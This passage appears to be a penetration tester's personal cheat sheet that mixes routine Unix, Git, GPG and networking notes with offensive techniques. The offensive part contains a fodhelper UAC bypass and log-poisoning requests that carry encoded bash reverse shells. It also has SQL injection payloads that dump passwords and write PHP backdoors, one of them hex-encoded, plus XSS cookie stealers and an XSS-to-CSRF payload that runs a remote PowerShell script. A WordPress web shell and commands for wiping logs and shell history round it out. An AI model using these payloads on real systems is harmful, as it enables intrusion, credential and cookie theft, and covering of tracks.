PS > Bypass-UAC -C "C:\Users\snovvcrash\music\met.exe"
```




## fodhelper

```
PS > New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
PS > New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
Cmd > fodhelper
```





# Unix




## Encodings

From CP1252 to UTF-8:

```
$ iconv -f CP1252 -t UTF8 inputfile.txt -o outputfile.txt
Or
$ enconv -x UTF8 somefile.txt
```

Check:

```
$ enconv -d somefile.txt
Or
$ file -i somefile.txt
```

Remove ANSI escape codes:

```
$ awk '{ gsub("\\x1B\\[[0-?]*[ -/]*[@-~]", ""); print }' somefile.txt
```



### Windows/Unix Text

```
input.txt: ASCII text
VS
input.txt: ASCII text, with CRLF line terminators
```

From Win to Unix:

```
$ awk '{ sub("\r$", ""); print }' input.txt > output.txt
Or
$ dos2unix input.txt
```

From Unix to Win:

```
$ awk 'sub("$", "\r")' input.txt > output.txt
Or
$ unix2dos input.txt
```




## Network



### Connections

```
$ netstat -anlp | grep LIST
$ ss -nlpt | grep LIST
```



### Public IP

```
$ wget -q -O - https://ipinfo.io/ip
```




## Virtual Terminal

```
Start:
CTRL + ALT + F1-6

Stop:
ALT + F8
```




## Process Kill

```
$ ps aux | grep firefox
Or
$ pidof firefox

$ kill -15 <PID>
Or
$ kill -SIGTERM <PID>
Or
$ kill <PID>

If -15 signal didn't help, use stronger -9 signal:
$ kill -9 <PID>
Or
$ kill -SIGKILL <PID>
```




## Dev



### Git

Add SSH key to the ssh-agent:

```
$ eval "$(ssh-agent -s)"
$ ssh-add ~/.ssh/id_rsa
```

Update to latest version:

```
$ sudo add-apt-repository ppa:git-core/ppa -y
$ sudo apt update
$ sudo apt install git -y
$ git version
```

Syncing a forked repository:

```
$ git remote add upstream https://github.com/original/repository.git
$ git fetch upstream
$ git checkout --track master
$ git rebase upstream/master (or git merge upstream/master)
$ git push -f origin master
```

Working with a repository during a pull request:

```
$ git remote add upstream https://github.com/original/repository.git
$ git fetch upstream
$ git rebase upstream/master
$ git checkout upstream/master
$ git checkout -b new-feature
...Make changes...
$ gc -am "Add a new feature"
$ git push -u origin new-feature
```



### C Library Path

```
$ echo '#include <sys/types.h>'' | gcc -E -x c - | grep '/types.h'
```



### Vangrind

```
$ valgrind --leak-check=full --track-origins=yes --leak-resolution=med ./a.out
```




## OpenSSL



### Encrypt/Decrypt

```
$ openssl enc -e -aes-128-ecb -in file.txt -out file.txt.ecb -K 10101010
$ openssl enc -d -aes-128-ecb -in file.txt.ecb -out file.txt.ecb_dec -K 10101010

$ echo 'secret_data1 + secret_data2 + secret_data3' | openssl enc -e -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
$ echo 'U2FsdGVkX1+d1qH1M3nhYFKscrg5QYt+AlTSBPHgdB4JEP8YSy1FX+xYdrfJ5cZgfoGrW+2On7lMxRIhKCUmWQ==' | openssl enc -d -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
```



### Generate Keys

```
$ ssh-keygen -t rsa -b 4096 -N 's3cr3t_p4ssw0rd' -C 'user@email.com' -f rsa_key
$ mv rsa_key rsa_key.old
$ openssl pkcs8 -topk8 -v2 des3 \
  -in rsa_key.old -passin 'pass:s3cr3t_p4ssw0rd' \
  -out rsa_key -passout 'pass:s3cr3t_p4ssw0rd'
$ chmod 600 rsa_key

$ openssl rsa -text -in rsa_key -passin 'pass:s3cr3t_p4ssw0rd'
$ openssl asn1parse -in rsa_key

$ ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_ed25519
```




## GPG

* [https://www.linode.com/docs/security/encryption/gpg-keys-to-send-encrypted-messages/](https://www.linode.com/docs/security/encryption/gpg-keys-to-send-encrypted-messages/)
* [https://habr.com/ru/post/358182/](https://habr.com/ru/post/358182/)
* [https://hackware.ru/?p=8215](https://hackware.ru/?p=8215)

List keychain:

```
$ gpg --list-keys
```

Gen key:

```
$ gpg --full-generate-key [--expert]
```

Gen revoke cert:

```
$ gpg --output revoke.asc --gen-revoke user@example.com
revoke.asc
```

Export user's public key:

```
$ gpg --armor --output user.pub --export user@example.com
user.pub
```

Import recipient's public key:

```
$ gpg --import recipient.pub
```

Sign and encrypt:

```
$ gpg -o/--output encrypted.txt.gpg -e/--encrypt -s/--sign -u/--local-user user1@example.com -r/--recipient user2@example.com plaintext.txt
encrypted.txt.gpg
```

List recipients:

```
$ gpg --list-only -v -d/--decrypt encrypted.txt.gpg
```

Verify signature:

```
$ gpg --verify signed.txt.gpg
$ gpg --verify signed.txt.sig signed.txt
```

Decrypt and verify:

```
$ gpg -o/--output decrypted.txt -d/--decrypt --try-secret-key user1@example.com encrypted.txt.gpg
$ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -r/--recipient user2@example.com encrypted.txt.gpg
```



### Signing Git Commits

* [https://www.youtube.com/watch?v=1vVIpIvboSg](https://www.youtube.com/watch?v=1vVIpIvboSg)
* [https://www.youtube.com/watch?v=4166ExAnxmo](https://www.youtube.com/watch?v=4166ExAnxmo)

Cache passphrase in gpg agent (dirty):

```
$ cd /tmp && touch aaa && gpg --sign aaa && rm aaa aaa.gpg && cd -
```




## Clear



### Log Files

```
$ > logfile
Or
$ cat /dev/null > logfile
Or
$ dd if=/dev/null of=logfile
Or
$ truncate logfile --size 0
```



### .bash_history

```
$ cat /dev/null > ~/.bash_history && history -c && exit
```




## Secure Delete

```
$ shred -zvu -n7 /path/to/file
$ find /path/to/dir -type f -exec shred -zvu -n7 {} \\;
$ shred -zv -n0 /dev/sdc1
```




## Partitions

* [https://youtu.be/QSpGaeHlkoE](https://youtu.be/QSpGaeHlkoE)

List devices:

```
$ lsblk
$ sudo fdisk -l
$ df -h
```

Manage partitions:

```
$ sudo fdisk /dev/sd??
```

Format:

```
$ sudo umount /dev/sd??
$ sudo mkfs.<type> -F 32 -I /dev/sd?? -n VOLUME-NAME
type: 'msdos' (=fat32), 'ntfs'
```




## Floppy

```
$ mcopy -i floppy.img 123.txt ::123.txt
$ mdel -i floppy.img 123.TXT
```




## Checksums

Compare file hashes:

```
$ md5sum /path/to/abc.txt | awk '{print $1, "/path/to/cba.txt"}' > /tmp/checksum.txt
$ md5sum -c /tmp/checksum.txt
```

Compare directory hashes:

```
$ hashdeep -c md5 -r /path/to/dir1 > dir1hashes.txt
$ hashdeep -c md5 -r -X -k dir1hashes.txt /path/to/dir2
```




## Permissions

Set defaults for files:

```
$ find . -type f -exec chmod 644 {} \;
```

Set defaults for directories:

```
$ find . -type d -exec chmod 755 {} \;
```




## Fix Linux Freezes while Copying

```
$ sudo crontab -l | { cat; echo '@reboot echo $((16*1024*1024)) > /proc/sys/vm/dirty_background_bytes'; } | crontab -
$ sudo crontab -l | { cat; echo '@reboot echo $((48*1024*1024)) > /proc/sys/vm/dirty_bytes'; } | crontab -
```




## Kernel

Remove old kernels:

```
$ dpkg -l linux-image-\* | grep ^ii
$ kernelver=$(uname -r | sed -r 's/-[a-z]+//')
$ dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve $kernelver
$ sudo apt-get purge $(dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve "$(uname -r | sed -r 's/-[a-z]+//')")
```




## Xfce4

Install `xfce4`:

```
$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install xfce4 xfce4-terminal gtk2-engines-pixbuf -y
```




## GIFs

```
$ sudo apt install peek -y
Or
$ sudo apt install byzanz xdotool -y
$ xdotool getmouselocation
$ byzanz-record --duration=15 --x=130 --y=90 --width=800 --height=500 ~/Desktop/out.gif
```




## NTP

```
$ sudo apt purge ntp -y
$ sudo timedatectl set-timezone Europe/Moscow
$ sudo vi /etc/systemd/timesyncd.conf
NTP=0.ru.pool.ntp.org 1.ru.pool.ntp.org 2.ru.pool.ntp.org 3.ru.pool.ntp.org
$ sudo service systemd-timesyncd restart
$ sudo timedatectl set-ntp true
$ timedatectl status
$ service systemd-timesyncd status
$ service systemd-timedated status
```

1. [https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/](https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/)
2. [http://billauer.co.il/blog/2019/01/ntp-systemd/](http://billauer.co.il/blog/2019/01/ntp-systemd/)




## ImageMagick

XOR 2 images:

```
$ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" img_out
```




## Utilities Syntax



### tar


#### .tar

Pack:

```
tar -cvf directory.tar directory
```

Unpack:

```
tar -xvf directory.tar
```


#### .tar.gz

Pack:

```
tar -cvzf directory.tar.gz directory
```

Unpack:

```
tar -xvzf directory.tar.gz
```


#### .tar.bz

Pack:

```
tar -cvjf directory.tar.bz directory
```

Unpack:

```
tar -xvjf directory.tar.bz
```



### scp

Local file to a remote system:

```
$ scp [-P 2222] file.txt snovvcrash@10.10.13.37:/remote/directory
```

Remote file to a local system:

```
$ scp [-P 2222] snovvcrash@10.10.13.37:/remote/file.txt /local/directory
```



### 7z

Encrypt and pack all files in directory::

```
$ 7z a packed.7z -mhe -p"p4sSw0rD" *
```

Decrypt and unpack:

```
$ 7z e packed.7z -p"p4sSw0rD"
```



### grep/find/sed

Recursive grep:

```
$ grep -nwr 'pattern' /path/to/dir
```

Recursive find and replace:

```
$ find . -type f -name "*.txt" -exec sed -i'' -e 's/\<foo\>/bar/g' {} +
```

Exec `strings` and grep on the result with printing filenames:

```
$ find . -type f -print -exec sh -c 'strings $1 | grep -i -n "signature"' sh {} \;
```

Find and `xargs` grep results:

```
$ find . -type f -print0 | xargs -0 grep <PATTERN>
```



### readlink

Get absolute path of a file:

```
$ readlink -f somefile.txt
```



### dpkg

```
$ dpkg -s <package_name>
$ dpkg-query -W -f='${Status}' <package_name>
$ OUT="dpkg-query-$(date +'%FT%H%M%S').csv"; echo 'package,version' > ${OUT} && dpkg-query -W -f '${Package},${Version}\n' >> ${OUT}
```



### iptables

* [An In-Depth Guide to iptables, the Linux Firewall - Boolean World](https://www.booleanworld.com/depth-guide-iptables-linux-firewall/)

List rules in all chains (default table is *filter*, there are *mangle*, *nat* and *raw* tables beside it):

```
$ sudo iptables -L -n --line-numbers [-t filter]
```

Print rules for all chains (for a specific chains):

```
$ sudo iptables -S [INPUT [1]]
```



### fail2ban

```bash
 # Filters location which turn into *user-defined* fail2ban iptables rules (automatically)
/etc/fail2ban/filter.d

 # Status
$ sudo service fail2ban status
$ sudo fail2ban-client status
$ sudo fail2ban-client status sshd

 # Unban all
$ sudo fail2ban-client unban --all
```



### veracrypt

* [https://www.veracrypt.fr/en/Downloads.html](https://www.veracrypt.fr/en/Downloads.html)

```
$ veracrypt -t --pim=0 --keyfiles='' --protect-hidden=no /home/snovvcrash/SecretVolume.dat /mnt
$ veracrypt -d
```



### openconnect

```
$ sudo openconnect --protocol=gp gp.megacorp.com -u snovvcrash
```




## Console Logging


### script

```
$ script tool-$(date "+%FT%H%M%S").script
```


### tmux

* [https://github.com/tmux-plugins/tmux-logging](https://github.com/tmux-plugins/tmux-logging)

```
bash ~/.tmux/plugins/tmux-logging/scripts/screen_capture.sh
bash ~/.tmux/plugins/tmux-logging/scripts/save_complete_history.sh
```


### Time in Prompt

#### bash

`~/.bashrc` (replace `!` with `%`):

```
PS1='${debian_chroot:!($debian_chroot)}[\D!d}|\D{!k:!M}] \[\033[01;32m\]λ  \[\033[00m\]\[\033[01;34m\]\w\[\033[00m\] '
```

#### zsh

`$ZSH_CUSTOM/themes/robbyrussell.zsh-theme` (replace `!` with `%`):

```
PROMPT="!(?:!{$fg_bold[green]!}➜ :!{$fg_bold[red]!}➜ ) "
PROMPT+='!{$fg[cyan]!}!(4~|!-1~/…/!2~|!3~)!{$reset_color!} $(git_prompt_info)'

if lsof -tac script "$(tty)" > /dev/null; then
    PROMPT="[!D{!d}|!D{!k:!M}]* $PROMPT"
else
    PROMPT="[!D{!d}|!D{!k:!M}] $PROMPT"
fi
```




## LAMP

* [https://stackoverflow.com/a/46908573](https://stackoverflow.com/a/46908573)

```
 # PHP
$ sudo add-apt-repository ppa:ondrej/php -y
$ sudo apt update
$ sudo apt install php7.2 -y
$ sudo apt install php7.2-curl php7.2-gd php7.2-json php7.2-mbstring -y

 # Apache
$ sudo apt install apache2 libapache2-mod-php7.2 -y
$ sudo service apache2 restart

 # MySQL
$ sudo apt install mysql-server php7.2-mysql
$ sudo mysql_secure_installation
$ service mysql restart

 # Test
$ sudo sh -c 'echo "<?php phpinfo(); ?>" > phpinfo.php'
-> http://127.0.0.1/phpinfo.php
```




## Fun



### CMatrix

```
$ sudo apt-get install cmatrix
```



### screenfetch

```
$ wget -O screenfetch https://raw.github.com/KittyKatt/screenFetch/master/screenfetch-dev
$ chmod +x screenfetch
$ sudo mv screenfetch /usr/bin
```





# VNC

Enum with MSF:

```
msf > use auxiliary/scanner/vnc/vnc_none_auth
```




## TightVNC

* [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)

Decrypt TightVNC password with MSF:

```
msf > irb
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["f0f0f0f0f0f0f0f0"].pack('H*'), fixedkey
=> "<DECRYPTED>"
```





# VirtualBox




## DHCP

```
Cmd > "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
```




## Shared Folders

```
$ sudo usermod -aG vboxsf `whoami`
$ sudo reboot
```




## Dirty Network Configurations

Manually:

```
$ sudo service NetworkManager stop
$ sudo ifconfig 
$ sudo ifconfig eth0 10.10.13.37 netmask 255.255.255.0
$ sudo route add default gw 10.10.13.1 dev eth0
$ sudo route -n
$ sudo vi /etc/resolv.conf 
$ ping 8.8.8.8
$ nslookup ya.ru
$ sudo systemctl enable ssh --now
```

Route inner traffic to eth0 (lan), internet to wlan0 (wan):

```
$ sudo route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.0.1     0.0.0.0         UG    100    0        0 eth0
0.0.0.0         172.20.10.1     0.0.0.0         UG    600    0        0 wlan0
172.20.10.0     0.0.0.0         255.255.255.240 U     600    0        0 wlan0
192.168.0.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0

$ sudo ip route add 192.168.0.0/16 via 192.168.0.1 metric 100 dev eth0
$ sudo ip route add 172.16.0.0/12 via 192.168.0.1 metric 100 dev eth0
$ sudo ip route add 10.0.0.0/8 via 192.168.0.1 metric 100 dev eth0
$ sudo ip route del 0.0.0.0/0 via 192.168.0.1 dev eth0

$ sudo route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.20.10.1     0.0.0.0         UG    600    0        0 wlan0
10.0.0.0        192.168.0.1     255.0.0.0       UG    100    0        0 eth0
172.16.0.0      192.168.0.1     255.240.0.0     UG    100    0        0 eth0
172.20.10.0     0.0.0.0         255.255.255.240 U     600    0        0 wlan0
192.168.0.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
192.168.0.0     192.168.0.1     255.255.0.0     UG    100    0        0 eth0

$ sudo chattr -i /etc/resolv.conf
$ sudo vi /etc/resolv.conf
...change dns resolve order if necessary...
```



### netplan

`/etc/netplan/*.yaml`:

```
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses: [10.10.13.37/24]
      gateway4: 10.10.13.1
      dhcp4: true
      optional: true
      nameservers:
        addresses: [8.8.8.8,8.8.4.4]
```

```
$ sudo service NetworkManager stop
$ sudo netplan apply
```





# WSUS

* [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus)




## WSUS HTTP (MitM)

* [https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf)
* [https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)



### Check

```
PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
      WUServer    REG_SZ    http://WSUS-SRV.megacorp.local:8530

PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer

HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
      UseWUServer    REG_DWORD    0x1
```




## WSUS Local Proxy (LPE)

* [https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)





# Web




## WAF

Enum WAF:

```
$ nmap -sV --script http-waf-detect 127.0.0.1 -p80
$ nmap -sV --script http-waf-fingerprint 127.0.0.1 -p80
+ wafw00f.py
```




## LFI/RFI



### PHP RFI with SMB

* [http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)

`/etc/samba/smb.conf`:

```
log level = 3
[share]
        comment = TEMP
        path = /tmp/smb
        writable = no
        guest ok = yes
        guest only = yes
        read only = yes
        browsable = yes
        directory mode = 0555
        force user = nobody
```

```
$ chmod 0555 /tmp/smb
$ chown -R nobody:nogroup /tmp/smb
$ service smbd restart
$ tail -f /var/log/samba/log.<HOSTNAME>
```



### Log Poisoning


#### PHP

* [https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
* [https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)

Access log (needs single `'` instead of double `"`):

```
$ nc 127.0.0.1 80
GET /<?php system($_GET['cmd']); ?>

$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
Or
$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
```

Error log:

```
$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
Or
$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
```




## SQLi



### MySQL


#### DIOS

* [https://defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
* [http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
* [https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
* [https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)

```
id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -

SELECT (@a) FROM (
	SELECT(@a:=0x00), (
		SELECT (@a) FROM (information_schema.schemata)
		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
	)
) foo
```

```
id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
```


#### Truncation Attack

* [https://www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)

```
POST /index.php HTTP/1.1
Host: 127.0.0.1

name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
```


#### Commas blocked by WAF

```
id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
```


#### Write File

```
id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1');} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
id=1' UNION SELECT 1,2,3,4,5,6 INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f68746d6c2f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a;-- -
```


#### Read File

```
id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
```



### MSSQL

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)



### sqlmap

* [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)

Write file:

```
$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
```

Test WAF:

* [https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)

```
$ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 -b --batch -v6
```




## XSS



### Redirections

* [https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections](https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections)

```html
<head> 
  <meta http-equiv="refresh" content="0; URL=http://www.example.com/" />
</head>
```



### Data Grabbers


#### Cookies

* [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

Img tag:

```
<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
```

Fetch:

```javascript
<script>
fetch('https://<SESSION>.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```



### XMLHttpRequest


#### XSS to LFI

* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

```javascript
<script>
var xhr = new XMLHttpRequest;
xhr.onload = function() {
	document.write(this.responseText);
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText);};x.open("GET","file:///etc/passwd");x.send();</script>
```


#### XSS to CSRF

* [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

If the endpoint is accessible only from localhost:

```javascript
<script>
var xhr;
if (window.XMLHttpRequest) {
	xhr = new XMLHttpRequest();
} else {
	xhr = new ActiveXObject("Microsoft.XMLHTTP");
}
xhr.open("POST", "/backdoor.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
</script>
```

With capturing CSRF token first:

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET', '/email', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@example.com')
};
</script>
```




## WordPress

Reverse-shell with a malicious plugin:

```
$ cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
$ zip plugin-shell.zip plugin-shell.php
...Upload plugin-shell.zip and install it (but do not activate)...
$ curl 'http://10.10.13.37/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami'
```



### wpscan

* [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
* [https://wpscan.com/profile](https://wpscan.com/profile)

```
$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force -e ap
$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt
```




## GitLab

* [https://devcraft.io/assets/hacktivitycon-slides.pdf](https://devcraft.io/assets/hacktivitycon-slides.pdf)
* [https://github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE)



### SSRF → Redis → RCE (CE/EE)

**CVE-2018-19571, CVE-2018-19585**

* [https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293)
* [https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)
* [https://www.exploit-db.com/exploits/49334](https://www.exploit-db.com/exploits/49334)

Also possible to use this payload (instead of IPv6) to bypass filter checks for localhost, but works only with `git://` scheme:

```
git://127.0.0.1:6379/%0a<REDIS_COMMANDS>
```



### Path Traversal → LFI → RCE (CE/EE)

**CVE-2020-10977**

* [https://xakep.ru/2020/05/26/gitlab-exploit/](https://xakep.ru/2020/05/26/gitlab-exploit/)
* [https://www.exploit-db.com/exploits/49076](https://www.exploit-db.com/exploits/49076)



### Path Traversal → File Write → RCE (EE)

**CVE-2019-19088**

* [https://gitlab.com/gitlab-org/gitlab/-/issues/36029](https://gitlab.com/gitlab-org/gitlab/-/issues/36029)




## Web Security Academy

* [All learning materials - detailed / Web Security Academy](https://portswigger.net/web-security/all-materials/detailed)
* [All labs / Web Security Academy](https://portswigger.net/web-security/all-labs)
* [SQL injection cheat sheet / Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [Cross-Site Scripting (XSS) Cheat Sheet / Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)




## Upgrade Burp

* [Downloads / Jython](https://www.jython.org/download.html)
* [Прокачай свой Burp! 11 наиболее полезных плагинов к Burp Suite — «Хакер»](https://xakep.ru/2018/08/23/burp-suite-plugins/)
* [Burp и его друзья / Блог компании Digital Security / Хабр](https://habr.com/ru/company/dsec/blog/529088/)



### Extensions

BApp Store:

* [ActiveScan++](https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976) **Pro**
* [Add Custom Header](https://portswigger.net/bappstore/807907f5380c4cb38748ef4fc1d8cdbc)
* [Additional CSRF Checks](https://portswigger.net/bappstore/2d12070c90cb4a0f91cde0b8927fd606)
* [Additional Scanner Checks](https://portswigger.net/bappstore/a158fd3fc9394253be3aa0bc4c181d1f) **Pro**
